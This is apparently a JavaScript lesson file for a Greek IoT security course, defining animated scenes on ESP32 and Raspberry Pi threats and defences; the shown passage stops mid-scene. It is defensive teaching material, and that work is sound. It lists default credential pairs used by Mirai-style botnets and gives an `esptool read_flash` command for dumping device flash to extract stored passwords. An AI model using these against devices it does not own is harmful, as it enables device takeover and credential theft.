// NetWatch Ακαδημία — 🔌 IoT Security: ESP32 & Raspberry Pi
// Διαδρομή από αρχάριο σε πρακτικό επίπεδο: hardening, TLS/MQTT, firmware, hardware, segmentation, monitoring.
// Μόνο αμυντική χρήση και δοκιμές σε ΔΙΚΕΣ σου συσκευές. Μορφή: academy/FORMAT.md
(function () {
  'use strict';
  const fx = s => s;  // (η μηχανή πλέον προστατεύει τα * μέσα σε `code`)
  const L = (...a) => fx(a.join('\n'));
  const R = String.raw;
  const text = (...a) => ({ t: 'text', md: L(...a) });
  const tip = (...a) => ({ t: 'tip', md: L(...a) });
  const warn = (...a) => ({ t: 'warn', md: L(...a) });
  const code = (lang, title, src, explain) => ({ t: 'code', lang, title, code: src.replace(/^\n/, '').replace(/\n\s*$/, ''), explain });
  const quiz = (q, opts, ok, why) => ({ t: 'quiz', q: fx(q), opts: opts.map(fx), ok, why: fx(why) });
  const anim = (scene, caption) => ({ t: 'anim', scene, caption });
  const nw = (tab, md) => ({ t: 'netwatch', tab, md });
  const table = (head, rows) => ({ t: 'table', head, rows });
  const cli = (title, prompt, banner, steps, done) => ({ t: 'cli', title, prompt, banner, steps, done });

  const RED = '#ff3b5c', GREEN = '#3ddc97', YEL = '#ffd23f', BLUE = '#3ec5ff', PURP = '#b388ff';

  // ====================================================================
  // SCENES (animations)
  // ====================================================================

  ACADEMY.scene('iot-attack-surface', {
    w: 640, h: 260, speed: 2800,
    intro: 'Μια IoT συσκευή δεν είναι μόνο «το κουτάκι». Δες από πόσα σημεία μπορεί να επιτεθεί κάποιος: **hardware, firmware, δίκτυο, cloud, app**.',
    nodes: [
      { id: 'esp', x: 90, y: 150, icon: '📟', label: 'ESP32\nhardware+firmware' },
      { id: 'ap', x: 250, y: 150, icon: '📶', label: 'Router\nWi‑Fi' },
      { id: 'cloud', x: 420, y: 150, icon: '☁️', label: 'Cloud / Broker' },
      { id: 'app', x: 570, y: 150, icon: '📱', label: 'App' },
      { id: 'att', x: 335, y: 45, icon: '🕵️', label: 'Επιτιθέμενος' },
    ],
    links: [['esp', 'ap', 'wifi'], ['ap', 'cloud'], ['cloud', 'app']],
    steps: [
      { from: 'att', to: 'esp', pkt: 'UART / JTAG', color: RED, mark: { esp: 'hl' }, say: '**Hardware:** ανοιχτά pins UART/JTAG, διάβασμα του SPI flash με ένα καλώδιο USB.' },
      { from: 'att', to: 'esp', pkt: 'κακό firmware', color: RED, mark: { esp: 'bad' }, say: '**Firmware:** OTA χωρίς υπογραφή → ο επιτιθέμενος ανεβάζει δικό του κώδικα.' },
      { from: 'esp', to: 'ap', pkt: 'MQTT plaintext', color: YEL, mark: { ap: 'hl' }, say: '**Δίκτυο:** κίνηση χωρίς TLS διαβάζεται από όποιον είναι στο ίδιο Wi‑Fi.' },
      { from: 'att', to: 'cloud', pkt: 'API χωρίς auth', color: RED, mark: { cloud: 'bad' }, say: '**Cloud/Broker:** broker με `allow_anonymous true` ή αδύναμο API key.' },
      { from: 'att', to: 'app', pkt: 'token στο APK', color: RED, mark: { app: 'bad' }, say: '**App:** κλειδιά «κρυμμένα» μέσα στην εφαρμογή του κινητού.' },
      { from: 'esp', via: ['ap'], to: 'cloud', pkt: 'TLS 🔒', color: GREEN, mark: { esp: 'ok', ap: 'ok', cloud: 'ok', app: 'ok' }, say: 'Σε αυτή τη διαδρομή μαθαίνεις να κλείνεις **κάθε** επίπεδο, όχι μόνο ένα.' },
    ],
  });

  ACADEMY.scene('iot-mirai', {
    w: 640, h: 290, speed: 2800,
    intro: '**Mirai (2016):** ένα botnet που σάρωνε το Internet για Telnet με εργοστασιακούς κωδικούς και «στρατολόγησε» εκατοντάδες χιλιάδες κάμερες και DVR.',
    nodes: [
      { id: 'bot', x: 80, y: 60, icon: '🤖', label: 'Bot\nσαρωτής' },
      { id: 'cnc', x: 80, y: 220, icon: '🧠', label: 'C&C server' },
      { id: 'net', x: 260, y: 140, icon: '🌐', label: 'Internet' },
      { id: 'cam1', x: 440, y: 45, icon: '📷', label: 'Κάμερα A\nroot/xc3511' },
      { id: 'cam2', x: 440, y: 140, icon: '📼', label: 'DVR B\nadmin/admin' },
      { id: 'cam3', x: 440, y: 235, icon: '📷', label: 'Κάμερα C\nδικός κωδικός' },
      { id: 'vic', x: 585, y: 140, icon: '🏢', label: 'Θύμα DDoS' },
    ],
    links: [['bot', 'net'], ['cnc', 'net'], ['net', 'cam1'], ['net', 'cam2'], ['net', 'cam3'], ['cam1', 'vic'], ['cam2', 'vic'], ['cam3', 'vic']],
    tables: [{ id: 'bots', title: 'Μολυσμένες συσκευές', head: ['Συσκευή', 'Κατάσταση'], rows: [] }],
    steps: [
      { from: 'bot', via: ['net'], to: ['cam1', 'cam2', 'cam3'], pkt: 'SYN :23', color: YEL, say: 'Το bot στέλνει SYN σε τυχαίες IP στη θύρα **23 (Telnet)** και **2323**.' },
      { from: 'bot', via: ['net'], to: 'cam1', pkt: 'root/xc3511', color: RED, mark: { cam1: 'bad' }, table: { bots: [['Κάμερα A', '🦠 μολύνθηκε']] }, say: 'Δοκιμάζει μια λίστα ~60 εργοστασιακών κωδικών. Η κάμερα A δέχεται τον πρώτο.' },
      { from: 'bot', via: ['net'], to: 'cam2', pkt: 'admin/admin', color: RED, mark: { cam2: 'bad' }, table: { bots: [['Κάμερα A', '🦠 μολύνθηκε'], ['DVR B', '🦠 μολύνθηκε']] }, say: 'Το DVR B έχει ακόμα `admin/admin`. Κατεβάζει το malware και γίνεται κι αυτό σαρωτής.' },
      { from: 'bot', via: ['net'], to: 'cam3', pkt: 'admin/admin', color: RED, drop: true, mark: { cam3: 'ok' }, say: 'Η κάμερα C έχει **μοναδικό κωδικό** και Telnet κλειστό → η επίθεση αποτυγχάνει.' },
      { from: 'cam1', via: ['net'], to: 'cnc', pkt: 'report', color: PURP, say: 'Οι μολυσμένες συσκευές «αναφέρονται» στο C&C (command & control).' },
      { from: 'cnc', via: ['net'], to: ['cam1', 'cam2'], pkt: 'ATTACK!', color: RED, say: 'Ο χειριστής δίνει εντολή επίθεσης σε όλο το botnet.' },
      { from: 'cam1', to: 'vic', pkt: 'flood', color: RED, mark: { vic: 'bad' }, say: 'Κάθε κάμερα στέλνει λίγη κίνηση…' },
      { from: 'cam2', to: 'vic', pkt: 'flood', color: RED, say: '…αλλά 600.000 κάμερες μαζί έριξαν το Dyn DNS και μαζί του Twitter, Netflix, GitHub (Οκτ. 2016).' },
    ],
  });

  ACADEMY.scene('iot-ssh-bruteforce', {
    w: 640, h: 280, speed: 2600,
    intro: 'Ένα Raspberry Pi με SSH ανοιχτό στο Internet δέχεται **χιλιάδες** προσπάθειες σύνδεσης την ημέρα. Δες πώς το **fail2ban** τις κόβει.',
    nodes: [
      { id: 'att', x: 80, y: 110, icon: '🕵️', label: 'Bot\n203.0.113.66' },
      { id: 'rt', x: 260, y: 110, icon: '📶', label: 'Router' },
      { id: 'pi', x: 470, y: 110, icon: '🍓', label: 'Raspberry Pi\nsshd + fail2ban' },
      { id: 'me', x: 260, y: 225, icon: '💻', label: 'Εσύ\nκλειδί ed25519' },
    ],
    links: [['att', 'rt'], ['rt', 'pi'], ['me', 'rt']],
    tables: [
      { id: 'log', title: 'journal (sshd)', head: ['IP', 'Αποτέλεσμα'], rows: [] },
      { id: 'ban', title: 'fail2ban: jail sshd', head: ['Banned IP', 'Για'], rows: [] },
    ],
    steps: [
      { from: 'att', via: ['rt'], to: 'pi', pkt: 'pi / raspberry', color: RED, table: { log: [['203.0.113.66', 'Failed password']] }, say: 'Πρώτη δοκιμή: ο παλιός default χρήστης `pi` με κωδικό `raspberry`.' },
      { from: 'att', via: ['rt'], to: 'pi', pkt: 'admin / 123456', color: RED, table: { log: [['203.0.113.66', 'Failed password'], ['203.0.113.66', 'Invalid user admin']] }, say: 'Δεύτερη: `admin/123456`. Αποτυχία.' },
      { from: 'att', via: ['rt'], to: 'pi', pkt: 'root / toor', color: RED, mark: { pi: 'hl' }, table: { log: [['203.0.113.66', 'Failed password'], ['203.0.113.66', 'Invalid user admin'], ['203.0.113.66', 'Failed password']] }, say: 'Τρίτη αποτυχία μέσα σε 10 λεπτά → φτάσαμε το `maxretry = 3`.' },
      { from: 'pi', to: 'pi', pkt: '', mark: { att: 'bad' }, table: { ban: [['203.0.113.66', '1 ώρα']] }, say: 'Το fail2ban διαβάζει το log, βλέπει 3 αποτυχίες και προσθέτει κανόνα firewall: **ban για 1 ώρα**.' },
      { from: 'att', via: ['rt'], to: 'pi', pkt: 'SYN :22', color: RED, drop: true, say: 'Κάθε νέα προσπάθεια από αυτή την IP κόβεται στο firewall, πριν φτάσει στο sshd.' },
      { from: 'me', via: ['rt'], to: 'pi', pkt: 'ssh key ✓', color: GREEN, mark: { me: 'ok', pi: 'ok' }, say: 'Εσύ μπαίνεις με **κλειδί**. Με `PasswordAuthentication no`, οι κωδικοί του bot δεν θα δούλευαν ποτέ.' },
    ],
  });

  ACADEMY.scene('iot-evil-twin', {
    w: 640, h: 280, speed: 2800,
    intro: '**Evil twin:** ψεύτικο access point με το ίδιο SSID. Τι γίνεται όταν το ESP32 σου «πέσει» πάνω του;',
    nodes: [
      { id: 'esp', x: 80, y: 140, icon: '📟', label: 'ESP32' },
      { id: 'ap', x: 300, y: 55, icon: '📶', label: 'HomeWiFi\nο αληθινός' },
      { id: 'evil', x: 300, y: 225, icon: '😈', label: 'HomeWiFi\nο ψεύτικος' },
      { id: 'pi', x: 530, y: 55, icon: '🍓', label: 'Broker\n:8883' },
      { id: 'att', x: 530, y: 225, icon: '🕵️', label: 'Laptop\nεπιτιθέμενου' },
    ],
    links: [['esp', 'ap', 'wifi'], ['esp', 'evil', 'wifi'], ['ap', 'pi'], ['evil', 'att']],
    steps: [
      { from: 'esp', to: 'ap', pkt: 'WPA2 ✓', color: GREEN, mark: { esp: 'ok' }, say: 'Το ESP32 είναι κανονικά συνδεδεμένο στο αληθινό δίκτυο.' },
      { from: 'att', via: ['evil'], to: 'esp', pkt: 'deauth ×100', color: RED, mark: { esp: 'hl' }, say: 'Ο επιτιθέμενος στέλνει πλαίσια **deauthentication**. Χωρίς PMF (802.11w) η συσκευή αποσυνδέεται.' },
      { from: 'esp', to: 'evil', pkt: 'probe HomeWiFi', color: YEL, say: 'Το ESP32 ψάχνει ξανά το «HomeWiFi» και βλέπει δυνατότερο σήμα από τον ψεύτικο AP.' },
      { from: 'evil', to: 'esp', pkt: '4-way handshake', color: RED, drop: true, mark: { evil: 'hl' }, say: 'Με **WPA2/WPA3 και δυνατό PSK** ο ψεύτικος AP δεν ξέρει τον κωδικό → το handshake αποτυγχάνει.' },
      { from: 'evil', to: 'esp', pkt: 'handshake ✓', color: RED, mark: { evil: 'bad', esp: 'bad' }, say: 'Αν όμως ο κωδικός **διέρρευσε** (π.χ. hardcoded στο GitHub), ο ψεύτικος AP τον ξέρει και το ESP32 συνδέεται.' },
      { from: 'esp', via: ['evil'], to: 'att', pkt: 'TLS ClientHello', color: BLUE, say: 'Τώρα όλη η κίνηση περνάει από το laptop του. Το ESP32 όμως μιλάει **TLS** με έλεγχο CA.' },
      { from: 'att', via: ['evil'], to: 'esp', pkt: 'ψεύτικο cert', color: RED, drop: true, mark: { esp: 'ok' }, say: 'Ο επιτιθέμενος δεν έχει πιστοποιητικό υπογεγραμμένο από τη δική σου CA → το ESP32 **κλείνει τη σύνδεση**. Άμυνα σε βάθος!' },
    ],
  });

  ACADEMY.scene('iot-mqtt-pubsub', {
    w: 640, h: 280, speed: 2500,
    intro: '**MQTT = publish/subscribe.** Οι συσκευές δεν μιλάνε απευθείας μεταξύ τους· όλα περνούν από τον **broker** (π.χ. Mosquitto στο Pi).',
    nodes: [
      { id: 'e1', x: 85, y: 60, icon: '🌡️', label: 'ESP32 #1\nDHT22' },
      { id: 'e2', x: 85, y: 215, icon: '💡', label: 'ESP32 #2\nρελέ' },
      { id: 'br', x: 320, y: 140, icon: '🍓', label: 'Mosquitto\nRaspberry Pi' },
      { id: 'dash', x: 555, y: 60, icon: '📊', label: 'Dashboard' },
      { id: 'ph', x: 555, y: 215, icon: '📱', label: 'Κινητό' },
    ],
    links: [['e1', 'br', 'wifi'], ['e2', 'br', 'wifi'], ['br', 'dash'], ['br', 'ph', 'wifi']],
    tables: [{ id: 'subs', title: 'Συνδρομές στον broker', head: ['Client', 'Topic'], rows: [] }],
    steps: [
      { from: 'dash', to: 'br', pkt: 'SUB home/+/temp', color: BLUE, table: { subs: [['dashboard', 'home/+/temp']] }, say: 'Το dashboard κάνει **subscribe** στο `home/+/temp`. Το `+` ταιριάζει ακριβώς ένα επίπεδο.' },
      { from: 'e2', to: 'br', pkt: 'SUB home/relay/set', color: BLUE, table: { subs: [['dashboard', 'home/+/temp'], ['esp32-2', 'home/relay/set']] }, say: 'Το ESP32 #2 ακούει για εντολές στο `home/relay/set`.' },
      { from: 'e1', to: 'br', pkt: 'PUB 22.5°C', color: GREEN, say: 'Το ESP32 #1 κάνει **publish** στο `home/esp1/temp`. Δεν ξέρει ποιος ακούει.' },
      { from: 'br', to: 'dash', pkt: '22.5°C', color: GREEN, mark: { dash: 'ok' }, say: 'Ο broker το προωθεί σε όσους έχουν ταιριαστή συνδρομή.' },
      { from: 'ph', to: 'br', pkt: 'PUB relay/set ON', color: YEL, say: 'Το κινητό στέλνει `ON` στο `home/relay/set`.' },
      { from: 'br', to: 'e2', pkt: 'ON', color: YEL, mark: { e2: 'hl' }, say: 'Το ρελέ ανάβει. Ερώτηση ασφαλείας: **ποιος** επιτρέπεται να γράφει σε αυτό το topic; Θα το λύσουμε με ACL.' },
    ],
  });

  ACADEMY.scene('iot-mqtt-sniff', {
    w: 640, h: 280, speed: 2700,
    intro: 'Το ίδιο μήνυμα MQTT, πρώτα **χωρίς** TLS (θύρα 1883) και μετά **με** TLS (θύρα 8883). Τι βλέπει κάποιος στο ίδιο δίκτυο;',
    nodes: [
      { id: 'esp', x: 80, y: 110, icon: '📟', label: 'ESP32' },
      { id: 'ap', x: 250, y: 110, icon: '📶', label: 'Wi‑Fi' },
      { id: 'br', x: 560, y: 110, icon: '🍓', label: 'Mosquitto' },
      { id: 'att', x: 405, y: 225, icon: '🕵️', label: 'Επιτιθέμενος\nστο ίδιο LAN' },
    ],
    links: [['esp', 'ap', 'wifi'], ['ap', 'br'], ['ap', 'att', 'wifi']],
    tables: [{ id: 'cap', title: 'Τι «πιάνει» ο επιτιθέμενος (tcpdump)', head: ['Θύρα', 'Περιεχόμενο'], rows: [] }],
    steps: [
      { from: 'esp', via: ['ap'], to: 'br', pkt: 'CONNECT :1883', color: YEL, say: 'Το ESP32 συνδέεται **χωρίς TLS** με username/password.' },
      { from: 'ap', to: 'att', pkt: 'αντίγραφο', color: RED, mark: { att: 'bad' }, table: { cap: [['1883', 'user=sensor01 pass=Kalimera2024']] }, say: 'Ο επιτιθέμενος βλέπει **ανοιχτά** τον κωδικό μέσα στο πακέτο CONNECT.' },
      { from: 'esp', via: ['ap'], to: 'br', pkt: 'temp=22.5', color: YEL, table: { cap: [['1883', 'user=sensor01 pass=Kalimera2024'], ['1883', 'home/esp1/temp 22.5']] }, say: 'Και κάθε μέτρηση, και κάθε εντολή.' },
      { from: 'att', via: ['ap'], to: 'br', pkt: 'PUB relay ON', color: RED, mark: { br: 'bad' }, say: 'Με τα κλεμμένα στοιχεία συνδέεται ως `sensor01` και στέλνει εντολές. 💥' },
      { from: 'esp', via: ['ap'], to: 'br', pkt: 'TLS :8883 🔒', color: GREEN, mark: { br: 'ok', esp: 'ok' }, say: 'Τώρα με **TLS** στη θύρα 8883 και τη δική σου CA.' },
      { from: 'ap', to: 'att', pkt: '17 03 03 9f e2…', color: PURP, table: { cap: [['8883', '17 03 03 00 4a 9f e2 1c 7b … (κρυπτογραφημένο)']] }, say: 'Ο επιτιθέμενος βλέπει μόνο **κρυπτογραφημένα bytes** (TLS records). Ούτε κωδικό, ούτε δεδομένα.' },
      { from: 'att', via: ['ap'], to: 'br', pkt: 'CONNECT :1883', color: RED, drop: true, say: 'Η 1883 είναι κλειστή για το LAN (μόνο localhost) → η σύνδεση κόβεται.' },
    ],
  });

  ACADEMY.scene('iot-tls-handshake', {
    w: 640, h: 270, speed: 2700,
    intro: 'Το **TLS 1.2/1.3 handshake** απλοποιημένο: πώς το ESP32 βεβαιώνεται ότι μιλάει με τον **δικό σου** broker.',
    nodes: [
      { id: 'esp', x: 100, y: 100, icon: '📟', label: 'ESP32\nέχει ca.crt' },
      { id: 'br', x: 540, y: 100, icon: '🍓', label: 'Mosquitto\nserver.crt+key' },
      { id: 'att', x: 320, y: 215, icon: '🕵️', label: 'MITM' },
    ],
    links: [['esp', 'br'], ['esp', 'att'], ['att', 'br']],
    tables: [{ id: 'chk', title: 'Έλεγχοι του ESP32', head: ['Έλεγχος', 'Αποτέλεσμα'], rows: [] }],
    steps: [
      { from: 'esp', to: 'br', pkt: 'ClientHello', color: BLUE, say: '**ClientHello:** εκδόσεις TLS, cipher suites, SNI (το όνομα του server) και ένα τυχαίο nonce.' },
      { from: 'br', to: 'esp', pkt: 'ServerHello + cert', color: YEL, say: 'Ο broker απαντά και στέλνει το **πιστοποιητικό** του (`server.crt`).' },
      { from: 'esp', to: 'esp', pkt: '', mark: { esp: 'hl' }, table: { chk: [['Υπογραφή από τη CA μου;', '✅'], ['Όνομα/SAN ταιριάζει;', '✅'], ['Ημερομηνίες (αν ελέγχονται)', '✅']] }, say: 'Το ESP32 ελέγχει την **υπογραφή** με το `ca.crt` που έχει μέσα του, και ότι το **όνομα** του server υπάρχει στο SAN.' },
      { from: 'esp', to: 'br', pkt: 'ECDHE key share', color: PURP, say: '**Key exchange (ECDHE):** οι δύο πλευρές φτιάχνουν κοινό μυστικό χωρίς να το στείλουν ποτέ στο δίκτυο.' },
      { from: 'br', to: 'esp', pkt: 'Finished 🔒', color: GREEN, mark: { esp: 'ok', br: 'ok' }, say: 'Από εδώ και πέρα όλα είναι κρυπτογραφημένα (AES-GCM ή ChaCha20).' },
      { from: 'esp', to: 'br', pkt: 'MQTT CONNECT 🔒', color: GREEN, say: 'Το username/password του MQTT ταξιδεύει πλέον **μέσα** στο τούνελ.' },
      { from: 'att', to: 'esp', pkt: 'self-signed cert', color: RED, drop: true, mark: { att: 'bad' }, table: { chk: [['Υπογραφή από τη CA μου;', '❌ άγνωστη CA'], ['Αποτέλεσμα', 'σύνδεση κόβεται']] }, say: 'Ένας MITM με δικό του πιστοποιητικό **αποτυγχάνει**, εκτός αν έχεις βάλει `setInsecure()`… που δεν θα βάλεις ποτέ.' },
    ],
  });

  ACADEMY.scene('iot-secure-boot', {
    w: 640, h: 270, speed: 2800,
    intro: '**Secure Boot v2:** κάθε στάδιο εκκίνησης ελέγχει την **ψηφιακή υπογραφή** του επόμενου. Η ρίζα εμπιστοσύνης είναι ένα hash στα **eFuses**.',
    nodes: [
      { id: 'ef', x: 90, y: 50, icon: '🔥', label: 'eFuse\nhash δημόσιου κλειδιού' },
      { id: 'rom', x: 90, y: 185, icon: '🧱', label: 'ROM bootloader\n(αμετάβλητο)' },
      { id: 'bl', x: 270, y: 185, icon: '🥾', label: '2nd stage\nbootloader' },
      { id: 'app', x: 440, y: 185, icon: '📦', label: 'App\nfirmware' },
      { id: 'run', x: 580, y: 185, icon: '✅', label: 'Τρέχει' },
      { id: 'att', x: 440, y: 50, icon: '🕵️', label: 'evil.bin\nχωρίς υπογραφή' },
    ],
    links: [['ef', 'rom'], ['rom', 'bl'], ['bl', 'app'], ['app', 'run'], ['att', 'app']],
    steps: [
      { from: 'ef', to: 'rom', pkt: 'SHA-256(pubkey)', color: PURP, mark: { ef: 'info' }, say: 'Στο eFuse είναι γραμμένο **μόνιμα** το hash του δημόσιου κλειδιού σου. Δεν αλλάζει ποτέ.' },
      { from: 'rom', to: 'bl', pkt: 'verify RSA-PSS', color: BLUE, mark: { rom: 'ok', bl: 'ok' }, say: 'Το ROM φορτώνει τον bootloader, ελέγχει ότι το κλειδί στο signature block ταιριάζει με το hash και ότι η **υπογραφή** είναι σωστή.' },
      { from: 'bl', to: 'app', pkt: 'verify ✓', color: BLUE, mark: { app: 'ok' }, say: 'Ο bootloader κάνει το ίδιο για το app image.' },
      { from: 'app', to: 'run', pkt: 'boot', color: GREEN, mark: { run: 'ok' }, say: 'Όλη η αλυσίδα είναι υπογεγραμμένη από **εσένα** → το firmware τρέχει.' },
      { from: 'att', to: 'app', pkt: 'flash evil.bin', color: RED, mark: { app: 'bad', att: 'bad' }, say: 'Κάποιος γράφει άλλο firmware στο flash (μέσω UART ή OTA).' },
      { from: 'bl', to: 'app', pkt: 'verify ✗', color: RED, drop: true, mark: { run: 'bad' }, say: 'Η υπογραφή δεν ταιριάζει → ο bootloader **αρνείται** να το εκκινήσει. Ο επιτιθέμενος δεν μπορεί να τρέξει δικό του κώδικα.' },
    ],
  });

  ACADEMY.scene('iot-ota-signed', {
    w: 640, h: 280, speed: 2700,
    intro: '**OTA (Over-The-Air) updates:** βολικά, αλλά και η πιο εύκολη πόρτα για κακόβουλο firmware αν δεν ελέγχεις **ποιος** έφτιαξε την ενημέρωση.',
    nodes: [
      { id: 'dev', x: 85, y: 60, icon: '👩‍💻', label: 'Εσύ\nsigning key' },
      { id: 'srv', x: 320, y: 60, icon: '🗄️', label: 'OTA server\nHTTPS' },
      { id: 'esp', x: 550, y: 140, icon: '📟', label: 'ESP32' },
      { id: 'att', x: 320, y: 225, icon: '🕵️', label: 'Επιτιθέμενος\nστο LAN' },
    ],
    links: [['dev', 'srv'], ['srv', 'esp'], ['att', 'esp', 'wifi']],
    steps: [
      { from: 'att', to: 'esp', pkt: 'ArduinoOTA :3232', color: RED, mark: { esp: 'bad' }, say: '❌ **Χωρίς κωδικό OTA:** οποιοσδήποτε στο ίδιο LAN ανεβάζει firmware στη θύρα 3232. Η συσκευή είναι πλέον δική του.' },
      { from: 'dev', to: 'srv', pkt: 'app.bin + υπογραφή', color: PURP, mark: { esp: '' }, say: '✅ Εσύ υπογράφεις το `app.bin` με το **ιδιωτικό** κλειδί (που δεν φεύγει ποτέ από τον υπολογιστή σου).' },
      { from: 'esp', to: 'srv', pkt: 'HTTPS GET', color: BLUE, say: 'Το ESP32 κατεβάζει την ενημέρωση μέσω **HTTPS**, ελέγχοντας το πιστοποιητικό του server.' },
      { from: 'srv', to: 'esp', pkt: 'signed app.bin', color: GREEN, mark: { esp: 'ok' }, say: 'Πριν γράψει το νέο partition ως «ενεργό», ελέγχει την **υπογραφή** με το δημόσιο κλειδί → ✓ → reboot.' },
      { from: 'att', to: 'esp', pkt: 'evil.bin', color: RED, drop: true, mark: { att: 'bad' }, say: 'Ο επιτιθέμενος στέλνει firmware χωρίς έγκυρη υπογραφή → **απορρίπτεται**. Το ESP32 μένει στην παλιά, σωστή έκδοση.' },
      { from: 'srv', to: 'esp', pkt: 'παλιά v1.0', color: YEL, drop: true, say: 'Με **anti-rollback** απορρίπτεται και μια παλιά (υπογεγραμμένη αλλά ευάλωτη) έκδοση.' },
    ],
  });

  ACADEMY.scene('iot-uart-dump', {
    w: 640, h: 260, speed: 2800,
    intro: 'Αμυντική ματιά: τι μπορεί να κάνει κάποιος που κρατάει **στο χέρι** τη συσκευή σου, με ένα καλώδιο USB και το `esptool`. (Δοκίμασέ το μόνο στο δικό σου ESP32.)',
    nodes: [
      { id: 'pc', x: 80, y: 110, icon: '💻', label: 'Laptop\nesptool' },
      { id: 'usb', x: 230, y: 110, icon: '🔌', label: 'USB‑UART' },
      { id: 'esp', x: 390, y: 110, icon: '📟', label: 'ESP32' },
      { id: 'fl', x: 555, y: 110, icon: '💾', label: 'SPI flash\n4MB' },
    ],
    links: [['pc', 'usb'], ['usb', 'esp', 'TX/RX'], ['esp', 'fl', 'SPI']],
    tables: [{ id: 'str', title: 'strings dump.bin | grep …', head: ['Βρέθηκε', 'Τιμή'], rows: [] }],
    steps: [
      { from: 'pc', via: ['usb'], to: 'esp', pkt: 'GPIO0=LOW + RST', color: YEL, mark: { esp: 'hl' }, say: 'Με το GPIO0 στο LOW κατά την εκκίνηση, το ESP32 μπαίνει σε **UART download mode** (το ROM).' },
      { from: 'esp', to: 'fl', pkt: 'read_flash', color: BLUE, say: '`esptool read_flash 0 0x400000 dump.bin` → το ROM διαβάζει όλο το flash.' },
      { from: 'fl', via: ['esp', 'usb'], to: 'pc', pkt: 'dump.bin', color: RED, mark: { pc: 'bad' }, table: { str: [['SSID', 'HomeWiFi'], ['Wi‑Fi pass', 'MyS3cretPass!'], ['MQTT pass', 'sensor01:Kalimera2024']] }, say: 'Χωρίς flash encryption, μια απλή αναζήτηση βρίσκει **κωδικούς Wi‑Fi, MQTT, κλειδιά** σε απλό κείμενο.' },
      { from: 'fl', via: ['esp', 'usb'], to: 'pc', pkt: 'dump.bin 🔒', color: PURP, mark: { pc: '', fl: 'ok' }, table: { str: [['SSID', '—'], ['Wi‑Fi pass', '—'], ['περιεχόμενο', '9f e2 1c 7b 03 a8 … (θόρυβος)']] }, say: 'Με **Flash Encryption** το dump είναι κρυπτογραφημένο με κλειδί που ζει μόνο στα eFuses του chip.' },
      { from: 'pc', via: ['usb'], to: 'esp', pkt: 'read_flash', color: RED, drop: true, mark: { esp: 'ok' }, say: 'Με **Secure Download Mode** ή απενεργοποιημένο UART download, το ROM δεν δέχεται καν εντολή ανάγνωσης.' },
    ],
  });

  ACADEMY.scene('iot-vlan-segmentation', {
    w: 640, h: 290, speed: 2700,
    intro: 'Το σπίτι χωρισμένο σε **δύο δίκτυα**: VLAN 10 (laptops, NAS) και VLAN 30 (IoT). Ο router/firewall αποφασίζει τι περνάει.',
    nodes: [
      { id: 'lap', x: 80, y: 60, icon: '💻', label: 'Laptop\nVLAN 10' },
      { id: 'nas', x: 80, y: 205, icon: '🗄️', label: 'NAS\nVLAN 10' },
      { id: 'fw', x: 310, y: 130, icon: '🧱', label: 'Router\nfirewall' },
      { id: 'pi', x: 310, y: 235, icon: '🍓', label: 'Pi broker\nVLAN 30' },
      { id: 'cam', x: 545, y: 60, icon: '📷', label: 'Κάμερα\nVLAN 30' },
      { id: 'esp', x: 545, y: 205, icon: '📟', label: 'ESP32\nVLAN 30' },
    ],
    links: [['lap', 'fw', 'VLAN 10'], ['nas', 'fw'], ['fw', 'cam', 'VLAN 30'], ['fw', 'esp', 'wifi'], ['fw', 'pi']],
    tables: [{ id: 'fw', title: 'Κανόνες firewall', head: ['Από → Προς', 'Ενέργεια'], rows: [['IoT → LAN', 'DROP'], ['IoT → broker:8883', 'ACCEPT'], ['LAN → IoT', 'ACCEPT'], ['IoT → Internet', 'μόνο ό,τι χρειάζεται']] }],
    steps: [
      { from: 'cam', to: 'cam', pkt: '', mark: { cam: 'bad' }, say: 'Η φτηνή κάμερα έχει ευπάθεια και ελέγχεται πλέον από επιτιθέμενο.' },
      { from: 'cam', via: ['fw'], to: 'lap', pkt: 'scan :445', color: RED, drop: true, mark: { fw: 'ok' }, say: 'Προσπαθεί να σαρώσει το laptop (SMB). Ο firewall: **IoT → LAN = DROP**.' },
      { from: 'cam', via: ['fw'], to: 'nas', pkt: 'brute :22', color: RED, drop: true, mark: { nas: 'ok', lap: 'ok' }, say: 'Το ίδιο για το NAS. Η ζημιά μένει **περιορισμένη** στο VLAN 30.' },
      { from: 'esp', via: ['fw'], to: 'pi', pkt: 'MQTT TLS :8883', color: GREEN, mark: { esp: 'ok', pi: 'ok' }, say: 'Το ESP32 φτάνει κανονικά στον broker: ρητός κανόνας ACCEPT μόνο για τη θύρα 8883.' },
      { from: 'lap', via: ['fw'], to: 'cam', pkt: 'RTSP :554', color: BLUE, say: 'Το laptop **μπορεί** να ανοίξει τη ροή της κάμερας (LAN → IoT), και οι απαντήσεις επιστρέφουν ως *established*.' },
      { from: 'cam', via: ['fw'], to: 'lap', pkt: 'απάντηση RTSP', color: BLUE, say: 'Stateful firewall: επιτρέπει την απάντηση γιατί **ξεκίνησε** από το LAN, όχι από την κάμερα.' },
    ],
  });

  ACADEMY.scene('iot-arp-spoof', {
    w: 640, h: 280, speed: 2700,
    intro: '**ARP spoofing:** ο επιτιθέμενος λέει ψέματα «η IP του router είναι στη δική μου MAC». Το Pi σου, που ακούει το ARP με scapy, το πιάνει.',
    nodes: [
      { id: 'rt', x: 320, y: 50, icon: '📶', label: 'Router\n192.168.1.1' },
      { id: 'esp', x: 110, y: 215, icon: '📟', label: 'ESP32\n.42' },
      { id: 'pi', x: 320, y: 215, icon: '🍓', label: 'Pi IDS\nscapy' },
      { id: 'att', x: 530, y: 215, icon: '🕵️', label: 'Επιτιθέμενος\n.66' },
    ],
    links: [['rt', 'esp', 'wifi'], ['rt', 'pi'], ['rt', 'att', 'wifi']],
    tables: [{ id: 'arp', title: 'Τι έχει μάθει το Pi (IP → MAC)', head: ['IP', 'MAC', 'Κατάσταση'], rows: [['192.168.1.1', 'a4:2b:b0:11:22:33', 'baseline']] }],
    steps: [
      { from: 'rt', to: ['esp', 'pi', 'att'], pkt: 'ARP .1 is-at a4:2b…', color: BLUE, say: 'Κανονικά: ο router ανακοινώνει τη MAC του. Το Pi την έχει ως **baseline**.' },
      { from: 'att', to: ['esp', 'pi'], pkt: '.1 is-at de:ad:be:ef…', color: RED, mark: { att: 'hl' }, say: 'Ο επιτιθέμενος στέλνει **gratuitous ARP replies**: «το .1 είμαι εγώ».' },
      { from: 'pi', to: 'pi', pkt: '', mark: { pi: 'hl' }, table: { arp: [['192.168.1.1', 'a4:2b:b0:11:22:33', 'baseline'], ['192.168.1.1', 'de:ad:be:ef:00:66', '⚠️ ΑΛΛΑΓΗ!']] }, say: 'Το script βλέπει ότι η IP του gateway άλλαξε MAC → **ύποπτο**.' },
